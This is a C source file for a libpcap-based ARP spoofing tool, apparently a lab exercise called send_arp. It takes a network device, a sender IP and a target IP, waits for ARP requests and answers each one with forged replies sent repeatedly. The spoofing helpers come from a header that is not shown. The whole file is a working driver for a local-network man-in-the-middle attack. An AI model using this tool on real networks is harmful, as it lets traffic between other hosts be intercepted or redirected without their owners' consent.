#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>

//for inet_addr()
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#include "packetheader.h"


int main(int argc, char *argv[])
{
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */

	u_char *send;
	int sender,target;
	char filestr[256];
	FILE* file;
	char myMAC[6];
	int temp;
	
	if(argc != 4){
		printf("usasge: ./send_arp [device] [sender ip] [target ip]\n");
		return(2);
	}

	dev = argv[1];
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	printf("getting from device - %s\n",dev);
	if( getmyMAC(myMAC,dev) != 1 ){
		printf("failed to find device MAC address\n");
		return(2);
	}

	/* Open the session in non-promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	printf("sender : %s target : %s\n",argv[2],argv[3]);
	printf("start\n");

	send=malloc(65536);
	sender=inet_addr(argv[2]);
	target=inet_addr(argv[3]);
	while(1){
		/* Grab a packet */
		switch(pcap_next_ex(handle,&header,&packet)){
			case 1:
				if( arp_spoof(send, (char*)packet, sender, target, myMAC) == 1){
					printf("catched request, sending reply\n");
					if (pcap_sendpacket(handle, send, 42) != 0){
						fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
					}
					else{
						for(temp=0;temp<10;temp++)
							pcap_sendpacket(handle, send, 42);
					}
				}
				break;
			case 0:
				printf("listening..\n");
				break;
			case -1:
				printf("error occurred\n");
				free(send);
				return(2);
				break;
			case -2:
				printf("end of file\n");
				free(send);
				return(2);
				break;
		}
	}
	/* And close the session */
	pcap_close(handle);
	free(send);
	return(0);
}
